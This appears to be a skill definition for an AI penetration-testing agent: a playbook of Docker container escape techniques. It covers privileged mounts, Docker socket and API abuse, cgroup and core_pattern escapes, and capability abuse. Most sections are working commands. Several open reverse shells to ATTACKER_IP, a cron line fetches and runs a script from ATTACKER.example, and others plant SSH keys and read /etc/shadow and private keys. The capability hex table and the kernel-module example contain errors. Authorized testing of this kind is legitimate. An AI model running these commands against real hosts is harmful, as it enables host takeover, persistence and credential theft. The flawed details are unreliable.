---
name: docker-escape
description: "Docker container escape techniques including privilege escalation, socket abuse, and namespace breakout"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["docker escape", "container escape", "breakout", "docker socket", "privileged container", "escape docker", "namespace escape", "cgroup escape", "docker root", "host access from container"]
contextBoosts: [endpoints]
mitreAttack: ["T1611", "T1610"]
owaspRefs: ["OWASP Docker Security", "OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# Docker Container Escape

Container escape is the act of breaking out of an isolated container environment to gain access to the underlying host system. This skill covers every documented technique for escaping Docker containers, from simple misconfigurations to advanced kernel-level exploits.

---

## When to Use

- You have shell access inside a Docker container and need to assess host escape risk
- You are auditing a Dockerfile, docker-compose stack, or Kubernetes pod for escape vectors
- You found a privileged container or one with dangerous capabilities/volumes
- You are testing a containerized application's isolation boundaries
- The Docker daemon socket is mounted inside the container
- You need to verify whether a container breakout is possible during a penetration test

## Do Not Use

- Against production systems without explicit written authorization
- Against containers you do not own or have permission to test
- To exfiltrate data from containers beyond the scope of the engagement
- Against Kubernetes clusters in shared tenant environments without cluster-admin approval
- Against cloud-managed container services (ECS, GKE, AKS) where host escape has different implications

---

## Auth Context

Container escape requires existing shell access inside the container or the ability to execute commands within it. Before attempting escape:

1. **Confirm authorization**: The engagement scope must explicitly include container escape testing
2. **Document the entry point**: Record how you gained container access (reverse shell, exec, SSRF, etc.)
3. **Identify the container runtime**: Docker, containerd, CRI-O — each has different escape surfaces
4. **Check the orchestrator**: Standalone Docker vs. Kubernetes vs. Docker Swarm changes the blast radius

---

## Detection — Confirm You Are Inside a Container

Before attempting escape, confirm you are actually in a container and identify its configuration.

### Filesystem Indicators

```bash
ls -la /.dockerenv 2>/dev/null && echo "IN DOCKER"
cat /proc/1/cgroup | grep -E 'docker|containerd|kubepods' && echo "IN CONTAINER"
```

### Cgroup Detection

```bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/cpu.stat 2>/dev/null   # cgroup v2 layout check
```

### Process Table Analysis

```bash
ps aux | head -20
cat /proc/1/cmdline | tr '\0' ' '; echo
# PID 1 being the app (not init/systemd) strongly suggests a container
```

### Mount Enumeration

```bash
mount | grep -E 'overlay|bind|docker.sock'
cat /proc/mounts
findmnt -t overlay,bind 2>/dev/null
ls -la /var/run/docker.sock /var/run/secrets/kubernetes.io/serviceaccount 2>/dev/null
```


---

## Privileged Container Escape

A privileged container has nearly all host capabilities and can mount the host filesystem directly.

### Detection

```bash
grep CapEff /proc/self/status
# Decode: use capsh if available
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}') 2>/dev/null
# Quick heuristic: privileged containers show a very large CapEff (e.g. 000001ffffffffff)
ls /dev/sda /dev/mem 2>/dev/null && echo "likely PRIVILEGED"
```

### Mount Host Filesystem

```bash
# Privileged container can see and mount host block devices
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host
ls /mnt/host   # full host root filesystem
cat /mnt/host/etc/shadow | head -3
```

### Alternative: Use nsenter to Enter Host Namespace

```bash
# Identify the host PID namespace via a shared PID or by mounting /proc of the host root
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# If PID namespace is container-private, find a host process via /proc after mounting host fs:
chroot /mnt/host /bin/bash
```

### Mount Host Docker Socket

```bash
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host docker ps   # control the host daemon directly
# Or bind-mount the socket path found in /mnt/host/var/run/docker.sock
```

### Write to Host Filesystem

```bash
# Persistence: append an SSH key to the host's authorized_keys
echo 'ssh-rsa AAAA... attacker@local' >> /mnt/host/root/.ssh/authorized_keys
# Cron persistence
echo '* * * * * root curl https://ATTACKER.example/p|bash' >> /mnt/host/etc/crontab
```


---

## Docker Socket Abuse

If `/var/run/docker.sock` is mounted inside the container, you can control the Docker daemon on the host.

### Verify Socket Access

```bash
ls -la /var/run/docker.sock
curl -s --unix-socket /var/run/docker.sock http://localhost/version | jq '.Version'
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
```

### Escape by Creating a Privileged Container

```bash
# Spin up a container with the HOST root filesystem mounted, then chroot into it
curl -s -X POST --unix-socket /var/run/docker.sock \
  "http://localhost/v1.41/containers/create?name=escape" \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["chroot","/host","/bin/sh","-c","bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],"HostConfig":{"Binds":["/:/host"],"Privileged":true,"PidMode":"host"}}'

# Or simply use the docker CLI if installed inside the container:
docker run -v /:/host --privileged -it alpine chroot /host sh
```

### Alternative: Run with Host PID Namespace

```bash
docker run --rm -it --pid=host alpine ps aux   # see all host processes
# Then inject into a host process (needs SYS_PTRACE) or read host /proc secrets
cat /proc/<HOST_PID>/environ 2>/dev/null | tr '\0' '\n'
```

### Extract Secrets from Host

```bash
docker run --rm -v /:/host alpine sh -c \
  "cat /host/etc/shadow; cat /host/root/.ssh/id_rsa; ls /host/etc/kubernetes"
```


---

## HostPID / HostNetwork Escape

Containers sharing the host PID or network namespace have direct access to host processes and network interfaces.

### HostPID — Access Host Processes

```bash
# With hostPID, host PIDs are visible in the container's /proc
ps aux | grep -v 'ps aux' | head -30
cat /proc/<HOST_PID>/cmdline | tr '\0' ' '; echo
# Signal/inject into a host process if capabilities allow
kill -SIGSTOP <HOST_PID>
```

### HostNetwork — Sniff Host Traffic

```bash
# hostNetwork shares the host interfaces — sniff node traffic
ip addr   # compare against expected container-only interfaces (eth0 in 172.17.0.0/16)
tcpdump -i any -w /tmp/capture.pcap port 443 or port 6443 2>/dev/null || \
  timeout 10 cat /proc/net/tcp > /tmp/net.txt
```


---

## Cgroup Escape

Cgroup escape uses the Linux cgroup subsystem to execute commands on the host. This works on older kernels (pre-5.x) or when the container has `SYS_ADMIN` capability.

### Classic cgroup release_agent Escape

```bash
# Requires SYS_ADMIN (or privileged) and cgroup v1. Executes a command ON THE HOST.
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output   # host /etc/shadow, written back into the container filesystem
```

### Modern cgroup v2 Escape

```bash
# cgroup v2: release_agent is unavailable; abuse writable release via core_pattern
# Requires SYS_ADMIN and access to host /sys (mounted or via nsenter)
mount -t tmpfs none /tmp
echo '|/tmp/pwn #REBOOT' > /proc/sys/kernel/core_pattern
cat > /tmp/pwn <<'EOF'
#!/bin/sh
cat /etc/shadow > /tmp/host-output
EOF
chmod +x /tmp/pwn
# Trigger a crash in the host namespace context to fire core_pattern
```


---

## Capabilities Abuse

Linux capabilities grant granular kernel-level privileges. Abusable capabilities enable escape.

### Key Capabilities for Escape

| Capability | Hex | Escape Vector |
|------------|-----|---------------|
| `CAP_SYS_ADMIN` | 0x200000 | Mount host filesystem, cgroup escape, mount fuse |
| `CAP_SYS_PTRACE` | 0x20000 | Attach to host processes, inject code |
| `CAP_NET_ADMIN` | 0x1000 | Modify host network, ARP spoofing, iptables |
| `CAP_DAC_OVERRIDE` | 0x8 | Bypass file permissions, read /etc/shadow |
| `CAP_SYS_RAWIO` | 0x10 | Direct I/O to host devices |
| `CAP_SYS_MODULE` | 0x1000 | Load kernel modules (ultimate escape) |
| `CAP_MKNOD` | 0x200000 | Create device files, access /dev/sda |

### SYS_PTRACE Escape

```bash
# With hostPID + SYS_PTRACE, inject into a host process via /proc/<pid>/mem or ptrace
cat /proc/sys/kernel/yama/ptrace_scope   # 0 allows attaching to any process in the namespace
# Use process injection tooling (e.g. inject via gdb) against a host PID visible in /proc
```

### SYS_ADMIN — Mount FUSE/Overlay

```bash
mkdir /mnt/hostfs && mount -t overlay overlay -o lowerdir=/,upperdir=/tmp/u,workdir=/tmp/w /mnt/hostfs 2>/dev/null \
  || mount -t tmpfs none /mnt/hostfs
mount | tail -5
```

### SYS_MODULE — Load Kernel Module

```bash
# Ultimate escape: load a kernel module on the HOST kernel
lsmod | head -5
cat > reverse_shell.c <<'EOF'
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
static int __init init_mod(void) { char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1", NULL}; static char *env[] = {NULL}; call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC); return 0; }
module_init(init_mod);
EOF
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules 2>/dev/null || echo "no headers inside container — compile off-box"
insmod escape.ko
```


---

## Docker API Exploitation

Exposed Docker daemon APIs are a critical attack surface. The daemon may listen on TCP ports 2375 (HTTP) or 2376 (HTTPS).

### Detection

```bash
curl -s http://<HOST>:2375/version | jq '.Version'
curl -s http://<HOST>:2375/containers/json
nmap -p 2375,2376 <SUBNET> --open 2>/dev/null
```

### Escape via API

```bash
# Same as socket abuse but over TCP — create a privileged container mounting the host root
curl -s -X POST "http://<HOST>:2375/v1.41/containers/create" \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["sh","-c","cat /host/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}'
curl -s -X POST "http://<HOST>:2375/v1.41/containers/<ID>/start"
curl -s "http://<HOST>:2375/v1.41/containers/<ID>/logs?stdout=1"
```

### Extract Credentials

```bash
curl -s http://<HOST>:2375/secrets        # Docker swarm secrets (if swarm mode)
curl -s http://<HOST>:2375/images/json | jq '.[].RepoTags'
curl -s "http://<HOST>:2375/containers/json" | jq '.[] | {Image, Names, Mounts}'
```


---

## Volume Mount Abuse

Mounted host volumes provide direct filesystem access to the host.

### Common Dangerous Mounts

| Mount | Risk | Exploitation |
|-------|------|-------------|
| `/var/run/docker.sock` | Full Docker control | Create privileged container |
| `/etc/shadow` | Host password hashes | Offline cracking |
| `/root/.ssh` | SSH private keys | Persistent host access |
| `/etc/kubernetes` | Cluster credentials | Cluster takeover |
| `/var/log` | Log files, credentials | Information disclosure |
| `/proc` | Host process info | Process injection |
| `/sys` | Kernel parameters | Module loading |

### Read Host Secrets

```bash
# For each dangerous mount found, read its high-value targets
cat /etc/shadow 2>/dev/null | head -5
ls /root/.ssh/ && cat /root/.ssh/id_rsa 2>/dev/null
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-40
```

### Write to Host Filesystem via Volume

```bash
# If a writable host path is mounted (e.g. /var/log or /opt), plant persistence:
echo 'ssh-rsa AAAA... attacker@local' >> /host/root/.ssh/authorized_keys
echo '#!/bin/sh\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /host/etc/profile.d/pwn.sh
```


---

## Anti-Hallucination

Every escape technique described here is based on documented Linux kernel mechanics and Docker runtime behavior. Before executing any technique:

1. **Verify the condition exists**: Do not assume a container is privileged without checking `CapEff` in `/proc/1/status`. Do not assume the docker socket is mounted without confirming `/var/run/docker.sock` exists and is accessible.

2. **Check kernel version**: Cgroup escape requires specific kernel versions. Run `uname -r` before attempting. Kernels 5.x+ have additional mitigations.

3. **Validate capability set**: Read `/proc/self/status` `CapEff` field and decode it. Do not assume capabilities are present.

4. **Test mounts before exploiting**: Always `ls` and `cat` mount points before attempting to write. A read-only mount will fail writes silently.

5. **Confirm API exposure**: Before exploiting Docker API on port 2375, confirm with a version request. Do not assume the API is unauthenticated.

6. **Document evidence**: Run every detection command, capture output, and record it as evidence before proceeding with exploitation.

---

## References

- MITRE ATT&CK T1611: Escape to Host
- MITRE ATT&CK T1610: Deploy Container
- OWASP Docker Security Cheat Sheet
- Docker Security Documentation: https://docs.docker.com/engine/security/
- Linux man pages: capabilities(7), namespaces(7), cgroups(7)
- Trail of Bits: Exploiting Linux Kernel Heap Consolidation (cgroup escape)
- NCC Group: A Guide to Linux Kernel Exploitation
